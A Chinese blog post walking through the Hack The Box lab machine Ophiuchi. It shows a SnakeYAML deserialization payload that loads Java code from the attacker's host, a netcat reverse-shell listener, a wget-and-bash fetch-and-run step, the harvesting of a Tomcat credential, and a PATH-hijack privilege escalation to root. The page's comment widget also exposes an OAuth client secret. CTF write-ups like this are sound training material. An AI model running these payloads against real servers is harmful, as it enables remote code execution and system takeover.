<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>Ophiuchi - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - Ophiuchi靶场信息  靶场类型  信息搜集Nmap首先使用nmap进行端口扫描 nmap -A -sS -sC -sV 10.10.10.227   Http我们可以看到开启了22和8080端口，让我们访问8080端口看看   这是个啥？一个YAML在线解析器，让我们随便输入点东西试试   此功能已暂停，嗯。。。有点意思 我们先看看其他功能点，比如tomcat 版本">
<meta property="og:type" content="article">
<meta property="og:title" content="Ophiuchi - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - Ophiuchi靶场信息  靶场类型  信息搜集Nmap首先使用nmap进行端口扫描 nmap -A -sS -sC -sV 10.10.10.227   Http我们可以看到开启了22和8080端口，让我们访问8080端口看看   这是个啥？一个YAML在线解析器，让我们随便输入点东西试试   此功能已暂停，嗯。。。有点意思 我们先看看其他功能点，比如tomcat 版本">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/bb2b3b64-d318-4d4f-a0bc-165526dc65a5.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/48e28a0b-adc8-4b59-b453-51590cfdc576.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/756fd8cc-a7bc-4287-b42c-7eb59a4fafda.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/041547b0-274e-4b92-aec0-2bb99be365dd.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/b1baf97e-c71b-4085-a0e0-ad9329272546.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/dee71ed1-c1e6-444a-9c01-d31dfbba76c4.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/e34f7a11-fde0-4f05-9135-9287eac00b9a.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/cc64a6f6-9f96-4115-ae06-8ba1fa5794b4.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/010084b7-6c85-4974-8c0f-9a87f1b389b3.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/cd2958e3-d629-48c2-8606-1228204b5c55.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/3f5a9c75-e4d6-4b4d-bb84-f255f2fabace.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/67d0a010-c44b-4972-b2f5-5a18b5d97121.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/0e044d36-a0eb-4098-9047-35ce6b5c5d32.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/a488d234-bf2a-45a1-830a-fbee6931ceff.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/640299e6-b57d-4268-a7fb-c8fc96dff19a.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/af532cfd-00a6-4ebf-8b30-3bd48c715c91.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/8d245e83-0a91-41a3-b9eb-5388d3289857.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/ae33afab-b8a8-4acb-b849-072e9cceb132.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/947d54ed-8ffe-4019-8430-fcdee7bebcc8.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/f0bd46a5-2084-41a4-a667-6c8494772caa.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/0f03f868-418c-4610-835b-1d7bb8f7bfcd.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/7620f6a9-e804-450d-894b-e5378b0e340f.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/83b665cd-06ff-4292-b05b-1352e56e401c.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/dfe0645f-3e73-4712-b796-e2181c60f15d.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/20433e2b-d9ad-44c1-a3fd-f1b1236b9994.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/1dd916a3-c826-4e51-9740-a4d9f90b2e54.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/31f233b9-828c-4253-9adc-981211e9652e.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/797a4f37-cc84-46cb-92fc-29dc7af4fb2e.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/0592ab35-2de8-41cf-99c9-e1695cca12ce.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/82c8f524-eb44-493c-8929-92b3d8148b96.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/fd7957cb-5d3e-48eb-8c96-3cff495d8975.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/b19efc93-d4e6-4c84-81d8-06e5959168ec.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/3df470b1-4aee-42fe-bd5e-65828c0c970b.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/e3a4e5d8-691e-4576-98fd-a1521a0b44cc.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/776d0636-eb2f-4262-bd74-02dec07b882d.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/f9e1d7d9-c073-4698-956d-d1acc9742c76.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/4a2b916b-955e-447a-95dd-44194c798cbc.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/a4a5d501-2fda-4870-b46d-bd68c5834b4b.png">
<meta property="article:published_time" content="2021-06-01T11:38:36.000Z">
<meta property="article:modified_time" content="2023-06-13T03:48:12.659Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/bb2b3b64-d318-4d4f-a0bc-165526dc65a5.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Ophiuchi - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Ophiuchi - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2021-06-01T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2021-06-01
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Ophiuchi"><span class="post-toc-text">Hackthebox - Ophiuchi</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-text">信息搜集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox/Hackthebox-Ophiuchi"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Ophiuchi - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2021-06-01 19:38:36" datetime="2021-06-01T11:38:36.000Z"  itemprop="datePublished">2021-06-01</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-Ophiuchi"><a href="#Hackthebox-Ophiuchi" class="headerlink" title="Hackthebox - Ophiuchi"></a>Hackthebox - Ophiuchi</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/bb2b3b64-d318-4d4f-a0bc-165526dc65a5.png" class>

<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/48e28a0b-adc8-4b59-b453-51590cfdc576.png" class>

<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>首先使用nmap进行端口扫描</p>
<p>nmap -A -sS -sC -sV 10.10.10.227</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/756fd8cc-a7bc-4287-b42c-7eb59a4fafda.png" class>

<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><p>我们可以看到开启了22和8080端口，让我们访问8080端口看看</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/041547b0-274e-4b92-aec0-2bb99be365dd.png" class>

<p>这是个啥？一个YAML在线解析器，让我们随便输入点东西试试</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/b1baf97e-c71b-4085-a0e0-ad9329272546.png" class>

<p>此功能已暂停，嗯。。。有点意思</p>
<p>我们先看看其他功能点，比如tomcat 版本为 Apache Tomcat 9.0.38</p>
<p>直接登录试试，万一有0day呢？（弱口令）</p>
<pre><code class="bash">[http://10.10.10.227:8080/manager](http://10.10.10.227:8080/manager)
</code></pre>
<p>咱们去登录试试</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/dee71ed1-c1e6-444a-9c01-d31dfbba76c4.png" class>

<p>测试了几个默认口令均无效，看来还是得把目光放到YAML上了，去google找找资料吧</p>
<p>在搜索过程中，发现tomcat 9.0.38存在 Snake yaml 反序列化漏洞</p>
<p>YAML在线解析器具有java类构造函数的功能</p>
<p>OK，那思路就有了</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>使用python3在本地开启一个http服务器</p>
<pre><code class="bash">python3 -m http.server 80
</code></pre>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/e34f7a11-fde0-4f05-9135-9287eac00b9a.png" class>

<p>使用YAML解析命令</p>
<pre><code class="bash">!!javax.script.ScriptEngineManager [
    !!java.net.URLClassLoader [[
        !!java.net.URL [&quot;http://10.10.14.184/&quot;]
    ]]
]
</code></pre>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/cc64a6f6-9f96-4115-ae06-8ba1fa5794b4.png" class>

<p>点击解析看看</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/010084b7-6c85-4974-8c0f-9a87f1b389b3.png" class>

<p>我们可以看到，虽然是失败，但确实&#x2F;META-INF&#x2F;services&#x2F;javax.script.ScriptEngineFactory 向我们的机器发出了请求</p>
<p>我们可以保持相同的文件结构来利用它，例如具有目录“META-INF”然后是 services 具有文件名的子目录 javax.script.ScriptEngineFactory，在该文件中，我们将调用我们的exploit</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/cd2958e3-d629-48c2-8606-1228204b5c55.png" class>

<p>创建一个文件，exploit.java 可以从这里获取java代码，然后我们将尝试ping我们的本地机器以查看exploit是否有效，以便我们获得反向shell</p>
<blockquote>
<p><a href="https://github.com/LucifielHack/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java" target="_blank" rel="noopener">https://github.com/LucifielHack/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java</a></p>
</blockquote>
<p>将该代码保存为exploit.java</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/3f5a9c75-e4d6-4b4d-bb84-f255f2fabace.png" class>

<p>然后使用javac进行编译，即可得到.class文件</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/67d0a010-c44b-4972-b2f5-5a18b5d97121.png" class>

<p>我们将snakeyaml.exploit写入到javax.script.ScriptEngineFactory中</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/0e044d36-a0eb-4098-9047-35ce6b5c5d32.png" class>

<p>然后我们新建一个文件夹 snakeyaml，然后将文件结构这样放</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/a488d234-bf2a-45a1-830a-fbee6931ceff.png" class>

<p>然后我们在Ophiuchi目录下使用python3开启一个http服务器</p>
<p>然后在YAML中属于我们第一次调用的poc来进行调用</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/640299e6-b57d-4268-a7fb-c8fc96dff19a.png" class>

<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/af532cfd-00a6-4ebf-8b30-3bd48c715c91.png" class>

<p>成功</p>
<p>然后我们在Ophiuchi目录中创建一个exploit.sh脚本</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/8d245e83-0a91-41a3-b9eb-5388d3289857.png" class>

<p>这个脚本是用来反弹shell用的</p>
<p>然后我们本地使用nc开启一个监听端口</p>
<pre><code class="bash">nc -nvlp 4444
</code></pre>
<p>然后，我们将wget将刚才写的bash脚本下载并保存到&#x2F;tmp目录中，然后使用bash执行它，现在我们休要修改我们的exploit.java文件</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/ae33afab-b8a8-4acb-b849-072e9cceb132.png" class>

<p>然后重新编译exploit.java文件</p>
<p>在YAML中继续执行我们刚才的代码</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/947d54ed-8ffe-4019-8430-fcdee7bebcc8.png" class>

<p>成功获取到shell，并且使用python3获得一个稳定的shell</p>
<pre><code class="bash">python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;;
</code></pre>
<p>PS：如果这里没有获取到，那应该是java的版本不对，新版本java不行，必须得使用java class 55版本进行编译</p>
<p>代码 javac –release 11 exploit.java</p>
<p>然后我们我们知道，该web服务器是使用apache tomcat进行搭建运行的，所以我们现在去查看tomcat的配置文件</p>
<p>使用find命令进行查找</p>
<pre><code class="bash">find / -name &quot;tomcat-users.xml&quot; 2&gt;/dev/null
</code></pre>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/f0bd46a5-2084-41a4-a667-6c8494772caa.png" class>

<p>找到了，然后使用cat查看即可</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/0f03f868-418c-4610-835b-1d7bb8f7bfcd.png" class>

<p>得到了账号密码</p>
<pre><code class="bash">username = admin
password = whythereisalimit
</code></pre>
<p>我们查看一下这台机器的账户</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/7620f6a9-e804-450d-894b-e5378b0e340f.png" class>

<p>我们可以看到，这台linux的机器上，admin居然是一个账户，而且权限还不低？出题人扣十分 记大过一次</p>
<p>咱们直接使用su进行登录或使用ssh进行登录即可</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/83b665cd-06ff-4292-b05b-1352e56e401c.png" class>

<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/dfe0645f-3e73-4712-b796-e2181c60f15d.png" class>

<p>成功拿到user权限的flag</p>
<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>使用sudo -l查看咱们的sudo权限</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/20433e2b-d9ad-44c1-a3fd-f1b1236b9994.png" class>

<p>咱们发现，可以直接使用root权限执行&#x2F;opt&#x2F;wasm-functions&#x2F;index.go文件，那提权的突破口肯定在这了，咱们查看一下吧</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/1dd916a3-c826-4e51-9740-a4d9f90b2e54.png" class>

<p>进行代码审计，咱们可以看到。它会读取Web程序集二进制文件，然后它会从info函数中获取一个值，如果该值不等于1，程序将会输出“Not ready to deploy”，不然将会执行一个deploy.sh脚本</p>
<p>有一点需要注意， main.wasm 和 deploy.sh 在源代码中没有绝对路径，这意味着我们可以创建自己的文件，然后使用 PATH 变量。 所以首先我要下载 main.wasm 到我的机器上</p>
<p>在目标机器目录&#x2F;opt&#x2F;wasm-functions目录中使用Python3开启一个服务器</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/31f233b9-828c-4253-9adc-981211e9652e.png" class>

<p>然后使用wget下载</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/797a4f37-cc84-46cb-92fc-29dc7af4fb2e.png" class>

<blockquote>
<p><a href="https://github.com/LucifielHack/wabt" target="_blank" rel="noopener">https://github.com/LucifielHack/wabt</a></p>
</blockquote>
<p>这里使用一个名为wabt(Web Assembly Binary Toolkit)的工具，我们需要将main.wasm文件转换为.wat文件，因为它是该二进制文件的文本格式。但在此之前首先让我们使用wasm-decompile查看二进制文件中的info函数，它将二进制文件反编译为C语言的格式</p>
<pre><code class="bash">./wabt/build/wasm-decompile main.wasm -o main.dcmp
</code></pre>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/0592ab35-2de8-41cf-99c9-e1695cca12ce.png" class>

<p>我们可以看到该info函数返回值0，这就是我们要修改的内容了</p>
<p>将.wasm转换为.wat文件</p>
<pre><code class="bash">./wabt/build/wasm2wat main.wasm -o main.wat
</code></pre>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/82c8f524-eb44-493c-8929-92b3d8148b96.png" class>

<p>然后打开main.wat文件</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/fd7957cb-5d3e-48eb-8c96-3cff495d8975.png" class>

<p>我们可以看到const值为0</p>
<p>我们将它改为1</p>
<p>现在我们需要修改回二进制形式(.wasm) 因此我们需要将.wat转换为.wasm</p>
<pre><code class="bash">./wabt/build/wat2wasm main.wat -o main.wasm
</code></pre>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/b19efc93-d4e6-4c84-81d8-06e5959168ec.png" class>

<p>将main.wasm上传到&#x2F;tmp目录</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/3df470b1-4aee-42fe-bd5e-65828c0c970b.png" class>

<p>咱们制作一个deploy.sh文件在&#x2F;tmp目录</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/e3a4e5d8-691e-4576-98fd-a1521a0b44cc.png" class>

<p>现在添加&#x2F;tmp到PATH变量并以sudo的形式运行golang源代码</p>
<pre><code class="bash">export PATH=/tmp:$PATH
echo $PATH
</code></pre>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/776d0636-eb2f-4262-bd74-02dec07b882d.png" class>

<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/f9e1d7d9-c073-4698-956d-d1acc9742c76.png" class>

<p>大家可以看到，已经运行成功了，直接使用bash -p进行提权即可</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/4a2b916b-955e-447a-95dd-44194c798cbc.png" class>

<p>提权成功</p>
<img src="/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/a4a5d501-2fda-4870-b46d-bd68c5834b4b.png" class>

<p>成功获得root权限的flag</p>
<p>收工睡觉</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/&title=《Ophiuchi - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/&title=《Ophiuchi - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Ophiuchi - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2021/06/03/Hackthebox/Hackthebox-TheNotebook/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">TheNotebook - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2021/05/31/Hackthebox/Hackthebox-Tenet/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Tenet - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2023</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/&title=《Ophiuchi - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
